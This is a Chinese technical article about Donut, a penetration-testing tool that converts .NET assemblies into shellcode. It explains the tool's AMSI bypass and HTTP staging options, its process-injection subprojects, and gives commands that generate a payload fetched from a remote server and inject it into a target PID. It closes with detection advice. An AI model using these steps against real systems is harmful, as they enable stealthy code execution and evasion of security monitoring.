> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/U_ldnllA-HpV_Ydqelly2A)

        最近的工作中，发现了一款被大量运用在渗透领域、用来生成 ShellCode 中常用到的转换工具，以替代 Powershell 逃避监测且使用频率很高，尤其是境外非常流行；这就是我今天要介绍的主角：DoNut，并在最后给出了检测要点。  

    一是文章很长，耐心看；二是这个工具实在强大，而且实战中频用；三是在上一篇 C&C 中，就用到了这个工具。

**一、背景**

1、在渗透测试中，C#将会逐步替代 Powershell；

2、就目前的趋势来说，C#开源的工具越来越多；  

3、使用 C#开发的程序都能通过 Donut 转换成 shellcode。

**二、下载、编译**  

1、下载地址：https://github.com/TheWover/donut

    这是一个由多个工具组成的工作集，核心程序是 donut，其它的都是它的辅助程序，但都有很用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpL3NYq1NSAA0IOctQgfdo6m9NWLujn0Kv6JV287XAfn5kYDDOvRtdW9CVP3RibGwwQ5N3RCib0JZEJQ/640?wx_fmt=png)

2、编译  

    帮助文档给出了编译方式，命令行下的 nmake，nmake -f Makefile.msvc

    编译后，生成 donut.exe。其他目录中的都有 sln，可以直接 vs2019 编译生成 Dll 或 Exe。

**三、功能**

    Donut 是一个 ShellCode 生成工具，可以将.NET 程序集转换为 ShellCode。这是对 Execute-Assembly 的进一步利用，隐蔽性更高，可扩展性更强。这个 donut 程序的版本是 0.93，可以将 Exe、Dll、Vbs、Js 转换成 ShellCode。  

Donut 的利用思路：

1. 将.NET 程序集转换为 shellcode，例如配合 SILENTTRINITY 使用 

2. 作为模块集成到其他工具中 

3. 扩展功能：支持类似 meterpreter 的 migrate 功能。

为了更为隐蔽，可以先使用 ProcessManager 列举已经加载 CLR 的进程，对其进行注入。

**1、帮助**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2hnvgPYNzpL3NYq1NSAA0IOctQgfdo6mfx2s5Be9lTBdglBe1gdbp5xOf4PicnVic4FhibSvYx5KA2iaOym6FjKsIA/640?wx_fmt=png)

<table width="NaN"><tbody><tr><th>Switch</th><th>Argument</th><th>Description</th></tr><tr><td>-a</td><td><var>arch</var></td><td>Target architecture for loader : 1=x86, 2=amd64, 3=x86+amd64(default).</td></tr><tr><td>-b</td><td><var>level</var></td><td>Behavior for bypassing AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail.(default)</td></tr><tr><td>-c</td><td><var>class</var></td><td>Optional class name. (required for .NET DLL) Can also include namespace: e.g&nbsp;<em>namespace.class</em></td></tr><tr><td>-d</td><td><var>name</var></td><td>AppDomain name to create for .NET. If entropy is enabled, one will be generated randomly.</td></tr><tr><td>-e</td><td><var>level</var></td><td>Entropy level. 1=None, 2=Generate random names, 3=Generate random names + use symmetric encryption (default)</td></tr><tr><td>-f</td><td><var>format</var></td><td>The output format of loader saved to file. 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=PowerShell, 7=C#, 8=Hexadecimal</td></tr><tr><td>-m</td><td><var>name</var></td><td>Optional method or function for DLL. (a method is required for .NET DLL)</td></tr><tr><td>-n</td><td><var>name</var></td><td>Module name for HTTP staging. If entropy is enabled, one is generated randomly.</td></tr><tr><td>-o</td><td><var>path</var></td><td>Specifies where Donut should save the loader. Default is "loader.bin" in the current directory.</td></tr><tr><td>-p</td><td><var>parameters</var></td><td>Optional parameters/command line inside quotations for DLL method/function or EXE.</td></tr><tr><td>-r</td><td><var>version</var></td><td>CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.</td></tr><tr><td>-s</td><td><var>server</var></td><td>URL for the HTTP server that will host a Donut module.</td></tr><tr><td>-t</td><td><br></td><td>Run the entrypoint of an unmanaged/native EXE as a thread and wait for thread to end.</td></tr><tr><td>-w</td><td><br></td><td>Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)</td></tr><tr><td>-x</td><td><var>option</var></td><td>Determines how the loader should exit. 1=exit thread (default), 2=exit process.</td></tr><tr><td>-y</td><td><var>addr</var></td><td>Creates a new thread for the loader and continues execution at the address of host process.</td></tr><tr><td>-z</td><td><var>engine</var></td><td>Pack/Compress the input file. 1=None, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman. Currently, the last three are only supported on Windows.</td></tr></tbody></table>

**2、****execute-assembly**

从内存中加载.NET 程序集，能够以 dll 的形式注入到其他进程中。

整个过程在内存执行，不写入文件系统 (此时注入 dll 需要使用 Dll 反射)。

Payload 以 dll 形式存在，不会产生可疑的进程。

注：如果使用 Loadlibrary 加载 dll，dll 必须写入文件系统。

3、**Donut**

基于 execute-assembly，以 shellcode 的形式实现从内存中加载.NET 程序集。

优点：注入到其他进程时不再依赖于 Dll 反射，更隐蔽，更易于扩展。

更隐蔽：指注入其他进程时不会存在 dll。

更易于扩展：指能够执行 shellcode 的方法都可以使用 Donut，基于 Donut 的二次开发也很容易。

**四、子项目**

**1、子项目**

1)DemoCreateProcess

c# 程序，编译后生成文件 DemoCreateProcess.dll，功能为将传入的两个参数作为启动进程。可通过 Donut 将其转换成 shellcode，用作测试 Donut 生成 shellcode 的功能是否有效。

2)DonutTest

c# 程序，编译后生成文件 DonutTest.exe，用于向指定 pid 的进程注入 shellcode。

数组中保存 base64 加密后的 shellcode，解密后通过 CreateRemoteThread 注入到指定进程。

3)rundotnet.cpp

c# 程序，编译后的文件为 rundotnet.exe，用于读取指定文件并使用 CLR 从内存加载.NET 程序集。

4)ModuleMonitor

使用 WMI 事件 Win32_ModuleLoadTrace 来监视模块加载，如果发现 CLR 注入，将会标记。

. 程序中判断 CLR 注入的方法：

如果进程加载了 CLR，但程序不是.NET 程序集，则 CLR 已注入其中。

. 程序中判断进程加载 CLR 的方法：

进程是否加载了与 CLR 相关的 dll(mscoree.dll,mscoreei.dll 和 mscorlib.dll)，dll 以 "msco" 开头。

    这个工程一般是作防御检测用，用来检测系统是否产生了 CLR 注入事件，所以在启动后进程会一直执行，实时记录系统加载新模块的事件。

5)ProcessManager

用于枚举当前计算机或远程计算机上的进程。

同 tasklist.exe 的功能类似，增加以下功能：

· 判断进程权限

· 判断进程位数 (32 位还是 64 位)

· 判断进程是否加载 CLR

**2、组件**

1）payload.c

Donut 的关键功能，实现以下操作：

(1) 获得 shellcode 并解密

提供两种方式：

· 从 payload.h 读取 shellcode 和解密密钥

· 从 HTTP 服务器下载 shellcode 和解密密钥

(2) 使用 CLR 从内存加载.NET 程序集

· 调用 ICLRMetaHost::GetRuntime 方法获取 ICLRRuntimeInfo 指针

· 使用 ICorRuntimeHost 接口

· 尝试关闭 AMSI 和 WLDP

· 使用 Load_3(...) 从内存中读取

2）exe2h

用来将 exe 转换为 shellcode 并保存到数组中。

从 payload.exe 中的.text 段中提取已编译的机器码 (包括 dll 和解密密钥)，将其作为数组保存到 payload_exe_x64.h 或 payload_exe_x86.h。

3）payload_exe_x64/x86.h

存储 64/32 位的机器码 (包括 dll 和解密密钥)。

4）inject.c

使用 RtlCreateUserThread 向指定进程注入 shellcode。

可用作测试向指定进程注入 shellcode 的功能。

5)runsc.c

C/S 架构，两个功能，可以发送和接收 shellcode 并执行。

用于测试 payload.bin 的功能。

6）encrypt.c

对称加密的实现。

7）hash.c

API Hashing，这里使用了 Maru hash。

8）donut.c

主程序，用于将.NET 程序集转换成 shellcode。

**五、测试**

**1、测试 Dll**

这里使用子项目 DemoCreateProcess

编译后生成文件 DemoCreateProcess.dll；

**2****、使用 Donut 生成 shellcode**

64 位：

donut.exe -a 2 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe

32 位：

donut.exe -a 1 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe

命令执行后生成文件 payload.bin。

如果加了 - u 指定 URL，会再生成一个随机名称的 Module 文件，实例如下：

donut.exe -a 2 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -u http://192.168.1.1

生成文件 payload.bin 和 YX63F37T。

将 YX63F37T 上传到 http://192.168.1.1。

接下来通过注入 shellcode 的方式执行 payload.bin，payload.bin 会从 http://192.168.1.1/YX63F37T 下载实际的 shellcode 并执行。

**3、查看进程信息**

这里使用子项目 ProcessManager。

列出进程后，Managed 选项如果为 True，代表该进程已经加载 CLR。

ProcessManager 支持对指定进程进行筛选，例如只查看 notepad.exe 的进行信息，命令如下：

ProcessManager.exe --name notepad

**4、注入 shellcode**

假设目标进程为 3306

(1) 使用子项目 DonutTest

将 payload.bin 作 base64 编码并保存在剪贴板，替换 DonutTest 工程中对应的变量，编译成功后执行如下命令：

DonutTest.exe 3306

(2) 使用 RtlCreateUserThread

命令如下：

inject.exe 3306 payload.bin

**六、**Donut **的检测：**

Donut 需要使用 CLR 从内存中加载.NET 程序集，可采取以下方法进行检测：

· 进程不是.NET 程序集

· 进程加载了与 CLR 相关的 dll(dll 以 "msco" 开头)

注：正常程序也有可能存在这个行为。

两种检测方法：

· 使用命令 tasklist /m msco*

· 使用 WMI 事件 Win32_ModuleLoadTrace 来监视模块加载

对满足以上条件的进程重点监控。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2hnvgPYNzpKdkicvCQWB0PpZM6MFUEPQefCljkkIy6u79UZv4Oxux3YmwO4ub9x1EcFG7c7ibuic04efG9fnrOxeA/640?wx_fmt=jpeg)